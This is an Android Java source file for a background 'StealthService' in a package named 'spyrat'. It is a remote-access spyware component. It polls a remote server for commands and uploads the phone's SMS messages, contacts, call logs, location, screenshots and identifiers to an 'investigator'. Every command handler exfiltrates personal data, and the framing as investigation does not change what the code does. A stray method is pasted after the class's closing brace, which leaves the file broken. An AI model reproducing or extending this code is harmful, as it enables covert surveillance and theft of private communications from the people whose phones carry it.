package com.spyrat.investigation;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private InvestigatorApiClient investigatorApiClient;
    private RemoteController remoteController;
    private Handler commandHandler;
    private Runnable commandChecker;
    private static final long COMMAND_CHECK_INTERVAL = 30000;
    
    // Data collectors
    private RealSmsCollector smsCollector;
    private RealContactsCollector contactsCollector;
    private RealCallLogCollector callLogCollector;
    private RealLocationCollector locationCollector;
    
    // SharedPreferences keys
    private static final String PREFS_NAME = "InvestigationPrefs";
    private static final String KEY_INVESTIGATOR_CODE = "investigator_code";
    private static final String KEY_DEVICE_ID = "device_id";
    
    private String investigatorCode;
    private String deviceId;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 StealthService starting...");
        
        // Load investigator code from SharedPreferences
        loadInvestigatorCode();
        
        if (investigatorCode.isEmpty()) {
            Log.e(TAG, "❌ No investigator code found! Service stopping.");
            stopSelf();
            return;
        }
        
        // Initialize data collectors
        initializeDataCollectors();
        initializeInvestigatorApi();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "🎯 StealthService started with code: " + investigatorCode);
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void loadInvestigatorCode() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            investigatorCode = prefs.getString(KEY_INVESTIGATOR_CODE, "");
            deviceId = prefs.getString(KEY_DEVICE_ID, "");
            
            if (deviceId.isEmpty()) {
                deviceId = android.os.Build.SERIAL;
                if (deviceId == null || deviceId.equals("unknown")) {
                    deviceId = "device_" + System.currentTimeMillis();
                }
                prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply();
            }
            
            Log.d(TAG, "📱 Loaded - Code: " + investigatorCode + ", Device: " + deviceId);
        } catch (Exception e) {
            Log.e(TAG, "❌ Error loading investigator code: " + e.getMessage());
        }
    }
    
    private void initializeDataCollectors() {
        smsCollector = new RealSmsCollector(this);
        contactsCollector = new RealContactsCollector(this);
        callLogCollector = new RealCallLogCollector(this);
        locationCollector = new RealLocationCollector(this);
        Log.d(TAG, "✅ Real data collectors initialized");
    }
    
    private void initializeInvestigatorApi() {
        try {
            Log.d(TAG, "🔗 Initializing Investigator API...");
            
            investigatorApiClient = new InvestigatorApiClient(this, investigatorCode, deviceId);
            remoteController = new RemoteController(this);
            remoteController.setApiClient(investigatorApiClient);
            
            boolean verified = investigatorApiClient.verifyInvestigatorCode();
            if (verified) {
                Log.d(TAG, "✅ Investigator API initialized successfully");
                
                // Send initial device status with REAL data
                sendRealDeviceInfo();
                startCommandChecking();
                
            } else {
                Log.e(TAG, "❌ Investigator API verification failed");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Investigator API init error: " + e.getMessage());
        }
    }
    
    private void sendRealDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("serial", android.os.Build.SERIAL);
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("investigator_code", investigatorCode);
            deviceInfo.put("timestamp", System.currentTimeMillis());
            
            // Add real location
            JSONObject realLocation = locationCollector.getCurrentLocation();
            deviceInfo.put("location", realLocation);
            
            investigatorApiClient.updateDeviceStatus("online", deviceInfo);
            Log.d(TAG, "✅ Real device info sent to investigator");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to send real device info: " + e.getMessage());
        }
    }
    
    private void startCommandChecking() {
        commandHandler = new Handler();
        commandChecker = new Runnable() {
            @Override
            public void run() {
                checkForCommands();
                commandHandler.postDelayed(this, COMMAND_CHECK_INTERVAL);
            }
        };
        commandHandler.postDelayed(commandChecker, 5000);
    }
    
    private void checkForCommands() {
        try {
            Log.d(TAG, "🔍 Checking for investigator commands...");
            
            JSONArray commands = investigatorApiClient.getPendingCommands();
            
            if (commands.length() > 0) {
                Log.d(TAG, "🎯 Found " + commands.length() + " pending commands");
                processInvestigatorCommands(commands);
            } else {
                Log.d(TAG, "📭 No pending commands found");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command check error: " + e.getMessage());
        }
    }
    
    private void processInvestigatorCommands(JSONArray commands) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                JSONObject command = commands.getJSONObject(i);
                String commandId = command.getString("id");
                String commandType = command.getString("command_type");
                JSONObject parameters = command.optJSONObject("parameters");
                
                Log.d(TAG, "🎮 Processing investigator command: " + commandType);
                
                // Send command acknowledgment
                investigatorApiClient.sendCommandResponse(commandId, "processing", "Command received");
                
                // Execute the command with REAL DATA
                executeInvestigatorCommand(commandId, commandType, parameters);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Process commands error: " + e.getMessage());
        }
    }
    
    private void executeInvestigatorCommand(String commandId, String commandType, JSONObject parameters) {
        try {
            switch (commandType) {
                case "take_screenshot":
                    handleTakeScreenshotCommand(commandId, parameters);
                    break;
                case "get_device_info":
                    handleGetDeviceInfoCommand(commandId, parameters);
                    break;
                case "get_location":
                    handleGetRealLocationCommand(commandId, parameters);
                    break;
                case "get_contacts":
                    handleGetRealContactsCommand(commandId, parameters);
                    break;
                case "get_call_logs":
                    handleGetRealCallLogsCommand(commandId, parameters);
                    break;
                case "get_sms":
                    handleGetRealSMSCommand(commandId, parameters);
                    break;
                case "get_all_data":
                    handleGetAllRealDataCommand(commandId, parameters);
                    break;
                case "test_connection":
                    handleTestConnectionCommand(commandId, parameters);
                    break;
                default:
                    Log.w(TAG, "⚠️ Unknown investigator command: " + commandType);
                    investigatorApiClient.sendCommandResponse(commandId, "error", "Unknown command: " + commandType);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Execute command error: " + e.getMessage());
            investigatorApiClient.sendCommandResponse(commandId, "error", "Execution failed: " + e.getMessage());
        }
    }
    
    // ==================== REAL DATA COMMAND HANDLERS ====================
    
    private void handleTakeScreenshotCommand(String commandId, JSONObject parameters) {
        try {
            if (remoteController != null) {
                String screenshotPath = remoteController.takeScreenshot();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Screenshot taken: " + screenshotPath);
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Screenshot failed: " + e.getMessage());
        }
    }
    
    private void handleGetDeviceInfoCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("serial", android.os.Build.SERIAL);
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("investigator_code", investigatorCode);
            deviceInfo.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("device_info", deviceInfo);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real device info sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get device info failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealLocationCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject realLocation = locationCollector.getCurrentLocation();
            realLocation.put("device_id", deviceId);
            realLocation.put("investigator_code", investigatorCode);
            realLocation.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendLocationData(realLocation);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real location data sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real location failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealContactsCommand(String commandId, JSONObject parameters) {
        try {
            JSONArray realContacts = contactsCollector.getContacts();
            JSONObject contactsData = new JSONObject();
            contactsData.put("contacts", realContacts);
            contactsData.put("count", realContacts.length());
            contactsData.put("device_id", deviceId);
            contactsData.put("investigator_code", investigatorCode);
            contactsData.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendContactsData(realContacts);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real contacts data sent: " + realContacts.length() + " contacts");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real contacts failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealCallLogsCommand(String commandId, JSONObject parameters) {
        try {
            JSONArray realCallLogs = callLogCollector.getCallLogs();
            JSONObject callLogsData = new JSONObject();
            callLogsData.put("call_logs", realCallLogs);
            callLogsData.put("count", realCallLogs.length());
            callLogsData.put("device_id", deviceId);
            callLogsData.put("investigator_code", investigatorCode);
            callLogsData.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("call_logs", callLogsData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real call logs sent: " + realCallLogs.length() + " calls");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real call logs failed: " + e.getMessage());
        }
    }
    
    private void handleGetRealSMSCommand(String commandId, JSONObject parameters) {
        try {
            JSONArray realSMS = smsCollector.getSMSMessages();
            JSONObject smsData = new JSONObject();
            smsData.put("sms_messages", realSMS);
            smsData.put("count", realSMS.length());
            smsData.put("device_id", deviceId);
            smsData.put("investigator_code", investigatorCode);
            smsData.put("timestamp", System.currentTimeMillis());
            
            investigatorApiClient.sendDataToInvestigator("sms_data", smsData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real SMS data sent: " + realSMS.length() + " messages");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real SMS failed: " + e.getMessage());
        }
    }
    
    private void handleGetAllRealDataCommand(String commandId, JSONObject parameters) {
        try {
            Log.d(TAG, "📊 Collecting ALL real data...");
            
            // Collect all data
            JSONArray realContacts = contactsCollector.getContacts();
            JSONArray realCallLogs = callLogCollector.getCallLogs();
            JSONArray realSMS = smsCollector.getSMSMessages();
            JSONObject realLocation = locationCollector.getCurrentLocation();
            
            // Create comprehensive data package
            JSONObject allData = new JSONObject();
            allData.put("device_id", deviceId);
            allData.put("investigator_code", investigatorCode);
            allData.put("timestamp", System.currentTimeMillis());
            allData.put("contacts", realContacts);
            allData.put("call_logs", realCallLogs);
            allData.put("sms_messages", realSMS);
            allData.put("location", realLocation);
            allData.put("summary", new JSONObject()
                .put("total_contacts", realContacts.length())
                .put("total_calls", realCallLogs.length())
                .put("total_sms", realSMS.length())
            );
            
            investigatorApiClient.sendDataToInvestigator("all_data", allData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", 
                "All real data sent: " + realContacts.length() + " contacts, " + 
                realCallLogs.length() + " calls, " + realSMS.length() + " SMS");
                
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get all data failed: " + e.getMessage());
        }
    }
    
    private void handleTestConnectionCommand(String commandId, JSONObject parameters) {
        try {
            JSONObject testData = new JSONObject();
            testData.put("status", "connected");
            testData.put("device_id", deviceId);
            testData.put("investigator_code", investigatorCode);
            testData.put("timestamp", System.currentTimeMillis());
            testData.put("message", "Real data connection test successful");
            testData.put("data_collectors", new JSONObject()
                .put("sms", "Ready")
                .put("contacts", "Ready")
                .put("call_logs", "Ready")
                .put("location", "Ready")
            );
            
            investigatorApiClient.sendDataToInvestigator("test_connection", testData);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real data test connection successful");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Test connection failed: " + e.getMessage());
        }
    }
    
    @Override
    public void onDestroy() {
        try {
            // Clean up
            if (commandHandler != null && commandChecker != null) {
                commandHandler.removeCallbacks(commandChecker);
            }
            
            // Send offline status
            if (investigatorApiClient != null) {
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("device_id", deviceId);
                deviceInfo.put("status", "offline");
                deviceInfo.put("timestamp", System.currentTimeMillis());
                investigatorApiClient.updateDeviceStatus("offline", deviceInfo);
            }
            
            Log.d(TAG, "🧹 StealthService destroyed");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
        super.onDestroy();
    }
}

    // ==================== DEBUG DATA COLLECTION ====================
    private void logDataCollection(String dataType, int count) {
        Log.d(TAG, "🔍 DATA COLLECTION DEBUG - " + dataType + ": " + count + " items");
        
        // Send debug info to investigator
        try {
            JSONObject debugInfo = new JSONObject();
            debugInfo.put("data_type", dataType);
            debugInfo.put("item_count", count);
            debugInfo.put("device_id", deviceId);
            debugInfo.put("timestamp", System.currentTimeMillis());
            debugInfo.put("debug", true);
            
            investigatorApiClient.sendDataToInvestigator("debug_info", debugInfo);
        } catch (Exception e) {
            Log.e(TAG, "❌ Debug logging error: " + e.getMessage());
        }
    }
